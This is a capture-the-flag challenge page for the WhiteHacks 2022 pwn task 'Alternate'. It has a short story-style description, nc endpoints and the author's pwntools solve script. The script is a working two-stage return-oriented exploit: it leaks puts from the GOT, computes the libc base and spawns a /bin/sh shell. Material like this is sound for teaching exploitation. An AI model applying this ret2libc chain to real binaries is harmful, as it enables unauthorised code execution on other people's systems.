1 SOLVES 1000 points

# DESCRIPTION
Author: jinjinz

Difficulty: Medium

A wild alien has appeared! Our Earth Defense Forces did not predict this invasion and could not respond in time. The only usable weapon right now is a pair of loaded laser cannons that can fire just once. It is up to you as the marksman operator to take down this enemy of mankind. Also, there are some rumours that this alien is holding onto our flag. Make this shot count.

Challenge Access:
nc challenges1.whitehacks.xyz 22050
nc challenges2.whitehacks.xyz 22050
---
the source code was released after a while
# Solutions by other people
<https://github.com/caprinux/ctf-writeups/tree/main/WhiteHacks2022/Pwn/Alternate>

Author's solve script:
```#!/usr/bin/env python3

from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
elf = context.binary = ELF("./alternate")

BUFSIZE = 68

if args.REMOTE:
    io = remote("127.0.0.1", 8080)
    libc = ELF("./libc6_2.31-0ubuntu9_amd64")
else:
    io = elf.process()
    libc = io.libc


def send_payload(payload: bytes):
    alpha = bytes([x for i, x in enumerate(payload) if i % 2 == 0])
    beta = bytes([x for i, x in enumerate(payload) if i % 2 != 0])
    io.sendafter(b"Load up Cannon Alpha: ", alpha.ljust(BUFSIZE, b"\x00"))
    io.sendafter(b"Load up Cannon Beta: ", beta.ljust(BUFSIZE, b"\x00"))
    io.recvlines(2)


# Stage 1: Leak GOT and return to load_cannon()
rop = ROP(elf)
rop.puts(elf.got.puts)
rop.load_cannon()

log.debug(rop.dump())

payload = flat(
    {
        84: p32(BUFSIZE),
        88: p32(BUFSIZE),
        92: p32(BUFSIZE + len(rop.chain())),
        104: rop.chain(),
    }
)
send_payload(payload)

# Stage 2: Calculate libc base address
puts = u64(io.recvline(False).ljust(8, b"\x00"))
log.success(f"puts @ {hex(puts)}")

if args.REMOTE:
    libc.address = puts - libc.sym.puts

log.success(f"libc base @ {hex(libc.address)}")

# Stage 3: ROP Pwn
rop = ROP([elf, libc])
rop.raw(rop.ret)
rop.system(next(libc.search(b"/bin/sh\x00")))

log.debug(rop.dump())

payload = flat(
    {
        84: p32(BUFSIZE),
        88: p32(BUFSIZE),
        92: p32(BUFSIZE + len(rop.chain())),
        104: rop.chain(),
    }
)
send_payload(payload)

io.interactive()
io.close()
```